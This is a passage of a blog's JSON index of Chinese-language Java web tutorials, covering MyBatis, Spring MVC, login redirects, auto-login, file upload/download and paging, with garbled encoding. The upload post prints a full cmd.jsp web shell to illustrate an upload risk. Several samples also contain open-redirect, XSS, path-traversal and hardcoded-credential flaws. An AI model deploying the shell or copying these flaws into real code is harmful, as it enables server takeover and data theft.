configuration --&gt; &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt; &lt;!-- Sets the number of seconds the driver will wait for a response from the database --&gt; &lt;setting name=&quot;defaultStatementTimeout&quot; value=&quot;3000&quot;/&gt; &lt;!-- Enables automatic mapping from classic database column names A_COLUMN to camel case classic Java property names aColumn --&gt; &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt; &lt;!-- Allows JDBC support for generated keys. A compatible driver is required. This setting forces generated keys to be used if set to true, as some drivers deny compatibility but still work --&gt; &lt;setting name=&quot;useGeneratedKeys&quot; value=&quot;true&quot;/&gt; &lt;!--å¼€å¯æ‡’åŠ è½½--&gt; &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt; &lt;!--å…³é—­æ‡’åŠ è½½çš„å¯¹è±¡å¯èƒ½è¢«ä»»ä½•æ‡’å±æ€§å…¨éƒ¨åŠ è½½--&gt; &lt;setting name=&quot;aggressiveLazyLoading&quot; value=&quot;false&quot;/&gt; &lt;!--æ¶ˆé™¤equalsï¼Œhashcodeï¼ŒtoStringç­‰æ–¹æ³•å¯¹æ‡’åŠ è½½çš„å½±å“--&gt; &lt;setting name=&quot;lazyLoadTriggerMethods&quot; value=&quot;&quot;/&gt; &lt;/settings&gt;æµ‹è¯• package com.husky.test; import com.husky.pojo.Dept; import com.husky.pojo.Emp; import com.husky.pojo.Region; import org.apache.ibatis.io.Resources; import org.apache.ibatis.session.SqlSession; import org.apache.ibatis.session.SqlSessionFactory; import org.apache.ibatis.session.SqlSessionFactoryBuilder; import org.junit.Before; import java.io.IOException; import java.io.InputStream; public class Test { SqlSessionFactory factory; @Before public void before() throws IOException { String res = &quot;com/husky/sqlMapConfig.xml&quot;; InputStream is = Resources.getResourceAsStream(res); factory = new SqlSessionFactoryBuilder().build(is); } @org.junit.Test public void lazyTest(){ SqlSession session = factory.openSession(); Dept d = session.selectOne(&quot;findDeptById&quot;,42); System.out.println(d); System.out.println(d.getEmps()); } }è¾“å‡ºç»“æœ Dept{id=42, name=&apos;Operations&apos;, emps=null} [Emp{id=7, firstName=&apos;null&apos;, salary=1250.0, manager=null}, Emp{id=18, firstName=&apos;null&apos;, salary=1200.0, manager=null}, Emp{id=19, firstName=&apos;null&apos;, salary=795.0, manager=null}]","categories":[],"tags":[{"name":"mybatis","slug":"mybatis","permalink":"http://yoursite.com/tags/mybatis/"},{"name":"lazyload","slug":"lazyload","permalink":"http://yoursite.com/tags/lazyload/"}]},{"title":"springmvc é™æ€æ–‡ä»¶æ— æ³•è®¿é—®  js css img","slug":"springmvc é™æ€æ–‡ä»¶æ— æ³•è®¿é—®  js css img","date":"2018-06-14T03:43:57.000Z","updated":"2020-11-14T17:11:22.590Z","comments":true,"path":"2018/06/14/springmvc é™æ€æ–‡ä»¶æ— æ³•è®¿é—®  js css img/","link":"","permalink":"http://yoursite.com/2018/06/14/springmvc%20%E9%9D%99%E6%80%81%E6%96%87%E4%BB%B6%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%20%20js%20css%20img/","excerpt":"","text":"web.xmlé‡Œé¢é…ç½®çš„dispatchservlet &lt;servlet&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:spring.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;/servlet&gt; &lt;servlet-mapping&gt; &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt; &lt;url-pattern&gt;/&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;åœ¨jspä¸­è°ƒç”¨jquery.jsçš„æ—¶å€™ï¼Œæµè§ˆå™¨consoleæç¤ºï¼Œjquery.js 404 ,æ‰¾ä¸åˆ° url-patternæœ‰5ç§é…ç½®æ¨¡å¼ï¼š ï¼ˆ1ï¼‰/xxx:å®Œå…¨åŒ¹é…/xxxçš„è·¯å¾„ ï¼ˆ2ï¼‰/xxx/*:åŒ¹é…ä»¥/xxxå¼€å¤´çš„è·¯å¾„ï¼Œè¯·æ±‚ä¸­å¿…é¡»åŒ…å«xxxã€‚ ï¼ˆ3ï¼‰/*ï¼šåŒ¹é…/ä¸‹çš„æ‰€æœ‰è·¯å¾„,è¯·æ±‚å¯ä»¥è¿›å…¥åˆ°actionæˆ–controllerï¼Œä½†æ˜¯è½¬å‘jspæ—¶å†æ¬¡è¢«æ‹¦æˆªï¼Œä¸èƒ½è®¿é—®jspç•Œé¢ã€‚ ï¼ˆ4ï¼‰.xx:åŒ¹é…ä»¥xxç»“å°¾çš„è·¯å¾„ï¼Œæ‰€æœ‰è¯·æ±‚å¿…é¡»ä»¥.xxç»“å°¾ï¼Œä½†ä¸ä¼šå½±å“è®¿é—®é™æ€æ–‡ä»¶ã€‚ ï¼ˆ5ï¼‰/:é»˜è®¤æ¨¡å¼ï¼Œæœªè¢«åŒ¹é…çš„è·¯å¾„éƒ½å°†æ˜ å°„åˆ°åˆºservletï¼Œå¯¹jpgï¼Œjsï¼Œcssç­‰é™æ€æ–‡ä»¶ä¹Ÿå°†è¢«æ‹¦æˆªï¼Œä¸èƒ½è®¿é—®ã€‚ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼è§£å†³ï¼š1.åœ¨spring-mvc.xmlé‡Œé¢é…ç½® &lt;mvc:resources mapping=&quot;/js/&quot; location=&quot;/js/**&quot;/&gt; &lt;mvc:resources mapping=&quot;/css/&quot; location=&quot;/css/**&quot;/&gt; &lt;mvc:resources mapping=&quot;/img/&quot; location=&quot;/img/**&quot;/&gt;2.åœ¨web.xmlé‡Œé¢é…ç½® &lt;servlet-mapping&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;url-pattern&gt;/js/*&lt;/url-pattern&gt; &lt;/servlet-mapping&gt;æ­¤å¤„çš„defaulté¦–å…ˆæ‰€æœ‰çš„è¯·æ±‚è¿›å…¥tomcatï¼Œéƒ½ä¼šæµç»servletï¼Œå¦‚æœæ²¡æœ‰åŒ¹é…åˆ°ä»»ä½•åº”ç”¨æŒ‡å®šçš„servletï¼Œé‚£ä¹ˆå°±ä¼šæµåˆ°é»˜è®¤çš„servletã€‚","categories":[],"tags":[]},{"title":"idea maven spring javaæ™®é€šé¡¹ç›®","slug":"idea maven spring javaæ™®é€šé¡¹ç›®","date":"2018-06-05T09:30:32.000Z","updated":"2020-11-14T17:11:26.145Z","comments":true,"path":"2018/06/05/idea maven spring javaæ™®é€šé¡¹ç›®/","link":"","permalink":"http://yoursite.com/2018/06/05/idea%20maven%20spring%20java%E6%99%AE%E9%80%9A%E9%A1%B9%E7%9B%AE/","excerpt":"","text":"é…ç½®pom.xmlä¸‹é¢åœ¨pom.xmlé‡Œé¢æ·»åŠ  &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;4.3.16.RELEASE&lt;/version&gt; &lt;/dependency&gt;å…·ä½“çš„ï¼Œå¯ä»¥å» http://mvnrepository.com/artifact/org.springframework/spring-context è‡ªå·±é€‰æ‹©ï¼Œä½ éœ€è¦çš„ç‰ˆæœ¬pomå†™å¥½åï¼Œreimportä¸€ä¸‹ åœ¨srcæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªresourcesæ–‡ä»¶å¤¹ï¼Œå°†ä»–æ”¹ä¸ºResources root åœ¨é‡Œé¢æ–°å»ºspring-config.xml ç®€å•æµ‹è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸ","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"ç‚¹å‡»ç™»å½•åè·³è½¬å›åŸæ¥ç•Œé¢","slug":"ç‚¹å‡»ç™»å½•åè·³è½¬å›åŸæ¥ç•Œé¢","date":"2018-06-04T08:24:43.000Z","updated":"2020-11-14T17:11:26.639Z","comments":true,"path":"2018/06/04/ç‚¹å‡»ç™»å½•åè·³è½¬å›åŸæ¥ç•Œé¢/","link":"","permalink":"http://yoursite.com/2018/06/04/%E7%82%B9%E5%87%BB%E7%99%BB%E5%BD%95%E5%90%8E%E8%B7%B3%E8%BD%AC%E5%9B%9E%E5%8E%9F%E6%9D%A5%E7%95%8C%E9%9D%A2/","excerpt":"","text":"å…·ä½“æ€æƒ³ï¼Œåœ¨ç‚¹å‡»ç™»å½•æ˜¯æ—¶å€™ï¼Œå°†å½“å‰ç•Œé¢çš„åœ°å€callbacké€šè¿‡getæ–¹å¼ä¼ åˆ°loginç•Œé¢ï¼Œloginç•Œé¢å†é€šè¿‡æ–¹å¼ä¼ é€’è¿‡å» some.jsp &lt;%@ page import=&quot;java.util.List&quot; %&gt; &lt;%@ page import=&quot;java.util.Collection&quot; %&gt;&lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/6/4 0004 Time: ä¸Šåˆ 11:12 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;$Title$&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a id=&quot;logina&quot; href=&quot;login.jsp?callback=&quot;&gt;login&lt;/a&gt; &lt;/body&gt; &lt;script type=&quot;text/javascript&quot;&gt; var a = document.getElementById(&quot;logina&quot;); console.log(a); a.href+=window.location.href; &lt;/script&gt; &lt;/html&gt;login.jsp &lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/6/4 0004 Time: ä¸‹åˆ 1:04 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form method=&quot;post&quot; action=&quot;login&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;name&quot;/&gt; &lt;input type=&quot;password&quot; name=&quot;password&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;callback&quot; value=&quot;&lt;%=request.getParameter(&quot;callback&quot;)%&gt;&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;controller package controller; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;}) public class LoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); /** * çœç•¥å¯¹ç”¨æˆ·åå’Œå¯†ç çš„æ“ä½œï¼Œå’Œæ•°æ®åº“åŒ¹é… * * */ String callback = request.getParameter(&quot;callback&quot;); response.sendRedirect(callback); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } }","categories":[],"tags":[]},{"title":"javaee è‡ªåŠ¨ç™»å½•","slug":"javaee è‡ªåŠ¨ç™»å½•","date":"2018-05-24T15:27:11.000Z","updated":"2020-11-14T17:11:27.194Z","comments":true,"path":"2018/05/24/javaee è‡ªåŠ¨ç™»å½•/","link":"","permalink":"http://yoursite.com/2018/05/24/javaee%20%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95/","excerpt":"","text":"è‡ªåŠ¨ç™»å½•å‚ç…§æ€æƒ³ login..jsp &lt;%-- Created by IntelliJ IDEA. User: Administrator Date: 2018/5/24 0024 Time: ä¸‹åˆ 6:22 To change this template use File | Settings | File Templates. --%&gt; &lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body onload=&quot;login()&quot;&gt; &lt;form id=&quot;form&quot; action=&quot;login&quot; method=&quot;post&quot; &gt; &lt;input id=&quot;name&quot; type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;/&gt; &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; value=&quot;&quot;/&gt; è‡ªåŠ¨ç™»å½•&lt;input type=&quot;checkbox&quot; name=&quot;check&quot;/&gt; &lt;input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;login&quot;/&gt; &lt;/form&gt; &lt;script type=&quot;text/javascript&quot;&gt; function login() { var cookies = document.cookie; var name = cookies.split(&quot;;&quot;)[0].split(&quot;=&quot;)[1]; var token = cookies.split(&quot;;&quot;)[1].split(&quot;=&quot;)[1]; var checkon = cookies.split(&quot;;&quot;)[2].split(&quot;=&quot;)[1]; console.log(name +&quot; &quot;+token+&quot; &quot;+checkon); console.log(checkon); if(checkon==&quot;on&quot;){ console.log(&quot;yes&quot;); var nameInp = document.getElementById(&quot;name&quot;); nameInp.value = name; console.log(nameInp); var tokenInp = document.getElementById(&quot;token&quot;); tokenInp.value = token; document.getElementById(&quot;form&quot;).submit(); } } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;loginservlet.java package servlet; import dao.AutoLoginDao; import dao.impl.AutoLoginImpl; import util.RandomUtil; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; @WebServlet(name = &quot;LoginServlet&quot;,urlPatterns = {&quot;/login&quot;}) public class LoginServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String name = request.getParameter(&quot;name&quot;); String password = request.getParameter(&quot;password&quot;); String check = request.getParameter(&quot;check&quot;); String token = request.getParameter(&quot;token&quot;); System.out.println(&quot;name: &quot;+name+&quot;password: &quot;+password+&quot;check: &quot;+check); if(name.equals(&quot;admin&quot;)&amp;&amp;password.equals(&quot;admin&quot;)){//æ­¤å¤„ï¼Œåº”è¯¥æ˜¯åˆ¤æ–­nameå’Œpasswordæ—¶å€™åœ¨æ•°æ®åº“ Cookie cookie = new Cookie(&quot;name&quot;,name); cookie.setMaxAge(60*60); token = RandomUtil.randomString(10); Cookie cookie1 = new Cookie(&quot;token&quot;,token); cookie1.setMaxAge(60*60); AutoLoginDao ad = new AutoLoginImpl(); ad.addAutoLogin(name,token);//å°†æ•°æ®æ”¾å…¥æ•°æ®åº“ Cookie cookie2 = new Cookie(&quot;check&quot;,check); cookie2.setMaxAge(60*60); response.addCookie(cookie); response.addCookie(cookie1); response.addCookie(cookie2); response.getWriter().write(&quot;success&quot;); }else if(token!=null&amp;&amp;!token.equals(&quot;&quot;)){//tokenå­˜åœ¨ä¸”ä¸æ˜¯ä¸ºç©º AutoLoginDao ad = new AutoLoginImpl(); boolean result = ad.selectByNameAndToken(name,token);//åˆ¤æ–­tokenæ˜¯å¦å’Œæ•°æ®åº“ä¸€æ · if(result){ response.getWriter().write(&quot;success&quot;); }else{ Cookie cookie2 = new Cookie(&quot;check&quot;,&quot;notOn&quot;);//é˜²æ­¢é‡å¤è·³è½¬ response.sendRedirect(&quot;login.jsp&quot;); } }else{ response.sendRedirect(&quot;login.jsp&quot;);//ç™»å½•ä¸æˆåŠŸ } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }auto_login.sql create table auto_login( id int primary key auto_increment, user_id VARCHAR(30) not null , token text not null );å…·ä½“è¿™è¾¹çš„tokenéœ€è¦éšæœºç”Ÿæˆï¼Œæ‰€ä»¥éœ€è¦ç”¨ä¸€äº›ç‰¹åˆ«çš„åŠ å¯†ç®—æ³•ï¼Œmd5ç­‰ç­‰","categories":[],"tags":[]},{"title":"javaeeä¸Šä¼ æ–‡ä»¶ä¸‹è½½æ–‡ä»¶","slug":"javaeeä¸Šä¼ æ–‡ä»¶ä¸‹è½½æ–‡ä»¶","date":"2018-05-24T09:06:12.000Z","updated":"2020-11-14T17:11:28.311Z","comments":true,"path":"2018/05/24/javaeeä¸Šä¼ æ–‡ä»¶ä¸‹è½½æ–‡ä»¶/","link":"","permalink":"http://yoursite.com/2018/05/24/javaee%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/","excerpt":"","text":"*ä¸Šä¼  * upload.html &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;!--enctype=&quot;multipart/form-data&quot;æ”¯æŒäºŒè¿›åˆ¶ä¸Šä¼ æ•°æ®ï¼Œapplication/x-www-form-urlencodedæ”¯æŒæ–‡æœ¬ä¼ è¾“--&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt; &lt;input type=&quot;file&quot; name=&quot;file2&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt;UploadServlet.java package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.MultipartConfig; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.Part; import java.io.File; import java.io.IOException; import java.util.List; @WebServlet(name = &quot;UploadServlet&quot;,urlPatterns = {&quot;/upload&quot;}) @MultipartConfig //è¯¥æ³¨è§£ä¸»è¦æ˜¯ä¸ºäº†è¾…åŠ© Servlet 3.0 ä¸­ HttpServletRequest æä¾›çš„å¯¹ä¸Šä¼ æ–‡ä»¶çš„æ”¯æŒ public class UploadServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String path = request.getServletContext().getRealPath(&quot;&quot;);//è·å–æœåŠ¡å™¨å½“å‰ç›®å½• List&lt;Part&gt; partList = (List&lt;Part&gt;)request.getParts();//è·å¾— for(Part part: partList){ System.out.println(part.getName()); System.out.println(part.getSize()); System.out.println(part.getSubmittedFileName());//è¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–ä¸Šä¼ æ–‡ä»¶å System.out.println(path); part.write(path+ File.separator+part.getSubmittedFileName());//æäº¤åœ°å€ } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }å®‰å…¨é—®é¢˜ä¸Šé¢è¿™ä¸ªä¸Šä¼ æ–‡ä»¶ç›´æ¥ä¿å­˜åœ¨æœåŠ¡å™¨å½“å‰ç›®å½•ï¼Œä¹Ÿå°±æ˜¯ä½ ä¼ ä¸ªjspæ–‡ä»¶ä¹Ÿå¯ä»¥ï¼Œä¸Šä¼ æˆåŠŸï¼Œä¸‹é¢è¿™ä¸ªcmd.jspå°±å¯ä»¥é€ æˆå¾ˆå¤§çš„ç ´å &lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt; &lt;% // // JSP_KIT // // cmd.jsp = Command Execution (unix) // // by: Unknown // modified: 27/06/2003 // %&gt; &lt;HTML&gt;&lt;BODY&gt; &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;cmd.jsp&quot;&gt; &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt; &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt; &lt;/FORM&gt; &lt;pre&gt; &lt;% if (request.getParameter(&quot;cmd&quot;) != null) { out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;); Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %&gt; &lt;/pre&gt; &lt;/BODY&gt;&lt;/HTML&gt;å…·ä½“ï¼Œä½ å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ ï¼Œï¼Œï¼Œlocalhost:8080/upload/cmd.jsp,ç„¶ååœ¨formè¡¨å•èƒ½è¾“å…¥æŒ‡ä»¤ipconfigï¼Œå¯ä»¥è·å¾—æœåŠ¡å™¨çš„ipç­‰ç­‰ã€‚æ‰€ä»¥ï¼Œåœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™è·¯å¾„è¦æ”¹ï¼Œpart.write(â€œc:â€+File.separator+part.getSubmittedFileName());,ç›´æ¥å°†æ–‡ä»¶ä¿å­˜åœ¨cï¼šç›˜ï¼Œå½“ç„¶ï¼Œå…·ä½“è·¯å¾„ï¼Œä½ è‡ªä¾¿ ä¸‹è½½download.html &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=&quot;download?fileName=gakki.jpg&quot;&gt;gakki.jpg&lt;/a&gt; &lt;/body&gt; &lt;/html&gt;DownloadServlet package servlet; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.File; import java.io.FileInputStream; import java.io.IOException; import java.io.OutputStream; @WebServlet(name = &quot;DownloadServlet&quot;,urlPatterns = {&quot;/download&quot;}) public class DownloadServlet extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String fileName = request.getParameter(&quot;fileName&quot;); FileInputStream fis = new FileInputStream(&quot;c:&quot;+ File.separator+fileName); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=&quot;+fileName); OutputStream os = response.getOutputStream(); byte[] buf = new byte[1024]; int l = -1; while((l = fis.read(buf))!=-1){ os.write(buf,0,l); os.flush(); } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }","categories":[],"tags":[{"name":"ä¸Šä¼ ä¸‹è½½","slug":"ä¸Šä¼ ä¸‹è½½","permalink":"http://yoursite.com/tags/%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"}]},{"title":"ajax jqueryå®ç°åˆ†é¡µ","slug":"ajax jqueryå®ç°åˆ†é¡µ","date":"2018-05-20T12:39:00.000Z","updated":"2020-11-14T17:11:28.814Z","comments":true,"path":"2018/05/20/ajax jqueryå®ç°åˆ†é¡µ/","link":"","permalink":"http://yoursite.com/2018/05/20/ajax%20jquery%E5%AE%9E%E7%8E%B0%E5%88%86%E9%A1%B5/","excerpt":"","text":"æ¨¡ä»¿ä»¥ä¸Šä»£ç  html jséƒ¨åˆ† &lt;body onload=&quot;loadData()&quot;&gt; &lt;h2&gt;è¯„è®ºåŒº&lt;/h2&gt; &lt;table id=&quot;mytable&quot;&gt; &lt;tr&gt; &lt;th&gt;name&lt;/th&gt; &lt;th&gt;è¯„è®º&lt;/th&gt; &lt;th&gt;score&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;button onclick=&quot;reducePage()&quot;&gt;ä¸Šä¸€é¡µ&lt;/button&gt; &lt;button onclick=&quot;addPage()&quot;&gt;ä¸‹ä¸€é¡µ&lt;/button&gt; //è·³è½¬åˆ°æŒ‡å®šé¡µé¢ï¼Œå¯ä»¥è·å–è¾“å…¥æ¡†çš„å€¼ &lt;script&gt; var currentPage = 1; var gid = ${goods.id}; function addPage() { currentPage = currentPage + 1; loadData(); } function reducePage() { currentPage = currentPage - 1; loadData(); } function loadData() { // $(&quot;.detail&quot;).remove();//æ¯æ¬¡ä»apiè·å–å€¼æ—¶ï¼Œå…ˆæ¸…é™¤è¡¨æ ¼trçš„å†…å®¹ $.ajax({ url:&quot;GetCommentsController&quot;, method:&quot;get&quot;, data:&quot;currentPage=&quot;+currentPage+&quot;&amp;gid=&quot;+gid, success:function (result) { $(&quot;.detail&quot;).remove();//æ¯æ¬¡ä»apiè·å–å€¼æ—¶ï¼Œå…ˆæ¸…é™¤è¡¨æ ¼trçš„å†…å®¹ var results = JSON.parse(result); for(var i=0;i&lt;results.length;i++){ var id = results[i].id; var content = results[i].content; var user = results[i].user.name; var score = results[i].score; appendData(content,user,score); } } }); } function appendData(content,user,score) { var text = &apos;&lt;tr class=&quot;detail&quot;&gt;&lt;td&gt;&apos;+user+&apos;&lt;/td&gt;&lt;td&gt;&apos;+content+&apos;&lt;/td&gt;&lt;td&gt;&apos;+score+&apos;&lt;/td&gt;&lt;/tr&gt;&apos;; console.log(text); $(&apos;#mytable&apos;).append(text); }servletéƒ¨åˆ† @WebServlet(name = &quot;GetCommentsController&quot;,urlPatterns = {&quot;/GetCommentsController&quot;}) public class GetCommentsController extends HttpServlet { protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;); String gid = request.getParameter(&quot;gid&quot;); String currentPage = request.getParameter(&quot;currentPage&quot;); System.out.println(gid+&quot; &quot;+currentPage); CommentService cs = new CommentServiceImpl(); Goods goods = new Goods(); goods.setId(Integer.parseInt(gid)); Page page = new Page(); page.setNum(3); page.setCurrentPage(Integer.parseInt(currentPage)); page.setTotal(PageUtil.totalByGoods(Integer.parseInt(gid),3)); List&lt;Comment&gt; commentList= cs.getAllComments(goods,page); Gson gson = new Gson(); String str = gson.toJson(commentList); System.out.println(str); response.getWriter().write(str); } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { doPost(request,response); } }","categories":[],"tags":[]},{"title":"filterå®ç°ç”¨æˆ·ç™»å½•åæ‰èƒ½å‘æ–‡ç« çš„åŠŸèƒ½","slug":"filterå®ç°ç”¨æˆ·ç™»å½•åæ‰èƒ½å‘æ–‡ç« çš„åŠŸèƒ½","date":"2018-05-14T12:03:57.000Z","updated":"2020-11-14T17:11:29.861Z","comments":true,"path":"2018/05/14/filterå®ç°ç”¨æˆ·ç™»å½•åæ‰èƒ½å‘æ–‡ç« çš„åŠŸèƒ½/","link":"","permalink":"http://yoursite.com/2018/05/14/filter%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%90%8E%E6%89%8D%E8%83%BD%E5%8F%91%E6%96%87%E7%AB%A0%E7%9A%84%E5%8A%9F%E8%83%BD/","excerpt":"","text":"é¦–å…ˆï¼ŒBBSè®ºå›æ˜¯æ¸¸å®¢å’Œç”¨æˆ·éƒ½å¯ä»¥è®¿é—®çš„ï¼Œä½†æ˜¯åªæœ‰ç”¨æˆ·ç™»å½•åæ‰å¯ä»¥å‘å¸–å¦‚å›¾ä¸­ï¼Œå½“å‰æ²¡äººåœ¨çº¿ï¼Œå½“æˆ‘åœ¨ä¸‹æ–¹å‘å¸–å¤„è¾“å…¥ä¿¡æ¯ï¼Œå¹¶å‘å¸– &lt;form method=&quot;post&quot; action=&quot;WriteArticleServlet.do&quot;&gt; æ ‡é¢˜ï¼š&lt;input type=&quot;text&quot; placeholder=&quot;è¯·è¾“å…¥æ ‡é¢˜&quot; name=&quot;title&quot;&gt;&lt;br/&gt; å†…å®¹:&lt;textarea name=&quot;content&quot;&gt;&lt;/textarea&gt;&lt;br/&gt; &lt;button type=&quot;submit&quot;&gt;å‘å¸–&lt;/button&gt; &lt;/form&gt;æ­¤å¤„æ˜¯å‘å¸–å¤„çš„ä»£ç  @WebServlet(name = &quot;WriteArticleServlet&quot;,urlPatterns = {&quot;/WriteArticleServlet.do&quot;}) public class WriteArticleServlet extends HttpServlet { .....æ­¤å¤„æ˜¯writerArticleServletçš„ä»£ç äºæ˜¯ï¼Œåˆ›å»ºäº†ä¸€ä¸ªfilter package filter; import entity.User; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebFilter(filterName = &quot;WriteFilter&quot;,urlPatterns = {&quot;*.do&quot;})//æ­¤å¤„ï¼Œå¯¹.doç»“å°¾çš„è¿›è¡Œè¿‡æ»¤ï¼Œä¸€å®šè¦å†™å¯¹è¿™ä¸ªï¼Œä¸ç„¶Tomcatå°±ä¸æ–­æŠ¥é”™ public class WriteFilter implements Filter { public void destroy() { } public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException { HttpServletRequest httpServletRequest = (HttpServletRequest)req; HttpServletResponse httpServletResponse = (HttpServletResponse)resp; HttpSession session = httpServletRequest.getSession(); User user = (User)session.getAttribute(&quot;user&quot;);//è·å¾—å½“å‰çš„ç”¨æˆ·ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›null if(user!=null) { System.out.println(&quot;é€šè¿‡filter&quot;); chain.doFilter(req, resp);å…³äºchain.doFilter(request,response) 